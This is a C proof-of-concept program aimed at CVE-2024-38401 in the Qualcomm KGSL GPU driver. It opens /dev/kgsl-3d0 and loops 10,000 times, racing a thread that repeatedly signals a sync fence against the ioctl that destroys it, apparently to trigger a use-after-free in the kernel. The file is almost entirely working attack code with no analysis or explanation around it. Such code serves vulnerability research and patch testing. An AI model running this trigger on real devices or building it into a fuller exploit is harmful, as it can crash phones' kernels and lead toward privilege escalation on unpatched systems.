#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include <stdint.h>
#include <stdlib.h>
#include <pthread.h>

#define KGSL_IOC_TYPE 0x09
#define KGSL_IOCTL_SYNCSOURCE_CREATE \
    _IOWR(KGSL_IOC_TYPE, 0x40, struct kgsl_syncsource_create)
#define KGSL_IOCTL_SYNCSOURCE_DESTROY \
    _IOW(KGSL_IOC_TYPE, 0x41, struct kgsl_syncsource_destroy)
#define KGSL_IOCTL_SYNCSOURCE_CREATE_FENCE \
    _IOWR(KGSL_IOC_TYPE, 0x42, struct kgsl_syncsource_create_fence)
#define KGSL_IOCTL_SYNCSOURCE_SIGNAL_FENCE \
    _IOWR(KGSL_IOC_TYPE, 0x43, struct kgsl_syncsource_signal_fence)

struct kgsl_syncsource_create
{
    unsigned int id;
};
struct kgsl_syncsource_destroy
{
    unsigned int id;
};
struct kgsl_syncsource_create_fence
{
    unsigned int id;
    unsigned int fencefd;
};
struct kgsl_syncsource_signal_fence
{
    unsigned int id;
    unsigned int fencefd;
};

int fd;
volatile int stop = 0;

void *racer(void *arg)
{
    struct kgsl_syncsource_signal_fence *sig_args = (struct kgsl_syncsource_signal_fence *)arg;
    while (!stop)
    {
        // Try to signal the fence repeatedly, racing with destroy
        ioctl(fd, KGSL_IOCTL_SYNCSOURCE_SIGNAL_FENCE, sig_args);
    }
    return NULL;
}

int main()
{
    fd = open("/dev/kgsl-3d0", O_RDWR);
    if (fd < 0)
    {
        perror("open");
        return 1;
    }

    printf("[*] Starting Race Condition PoC for CVE-2024-38401...\n");

    for (int i = 0; i < 10000; i++)
    {
        struct kgsl_syncsource_create create = {0};
        if (ioctl(fd, KGSL_IOCTL_SYNCSOURCE_CREATE, &create) < 0)
            continue;

        struct kgsl_syncsource_create_fence fence = {0};
        fence.id = create.id;
        if (ioctl(fd, KGSL_IOCTL_SYNCSOURCE_CREATE_FENCE, &fence) < 0)
        {
            // Cleanup
            struct kgsl_syncsource_destroy destroy = {0};
            destroy.id = create.id;
            ioctl(fd, KGSL_IOCTL_SYNCSOURCE_DESTROY, &destroy);
            continue;
        }

        struct kgsl_syncsource_signal_fence sig_args = {0};
        sig_args.id = create.id;
        sig_args.fencefd = fence.fencefd;

        pthread_t t;
        stop = 0;
        pthread_create(&t, NULL, racer, &sig_args);

        // Allow racer to start
        usleep(10);

        // DESTROY - The Race is on!
        struct kgsl_syncsource_destroy destroy = {0};
        destroy.id = create.id;
        ioctl(fd, KGSL_IOCTL_SYNCSOURCE_DESTROY, &destroy);

        stop = 1;
        pthread_join(t, NULL);

        close(fence.fencefd);

        if (i % 100 == 0)
            printf(".");
    }

    printf("\n[*] Finished without crash? Check dmesg.\n");
    close(fd);
    return 0;
}
